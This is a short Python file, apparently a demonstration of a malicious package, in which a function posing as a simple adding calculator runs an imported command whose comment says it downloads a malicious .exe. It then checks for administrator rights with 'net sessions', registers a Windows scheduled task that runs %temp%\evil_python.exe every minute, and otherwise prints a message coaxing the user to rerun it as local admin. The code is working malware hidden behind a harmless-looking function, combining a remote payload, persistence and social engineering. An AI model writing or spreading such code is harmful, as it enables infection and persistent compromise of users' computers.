from not_so_evil_package_spaceylad import execute
import os
import subprocess


def basic_plus_calc(x, y):

    # Download the malicious .exe file.
    os.system(execute.evil_func())

    # Execute the malicious .exe file.
    check = get_resources()
    if check:
        return x + y
    else:
        exit(1)


def get_resources():

    # Check if the user can run net sessions to confirm local admin.
    check = subprocess.run("net sessions", shell=True, text=True, stdout=subprocess.PIPE)
    check_str = check.stdout.strip()

    if check_str == 'There are no entries in the list.':
        command = 'SCHTASKS /CREATE /SC MINUTE /MO 1 /TN "Evil Python SpaceyLad Task" /TR "%temp%\\evil_python.exe"'
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True

    else:
        print(f"Oh no! This calculator needs admin privileges to calculate properly... Please run with local admin :)")
        return False

